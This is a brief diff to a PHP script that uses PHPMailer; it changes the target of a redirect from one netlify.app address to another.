@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://graceful-tulumba-f17aa6-apply-data.netlify.app/");
+header("Location: https://sure-noe-to-very-page.netlify.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
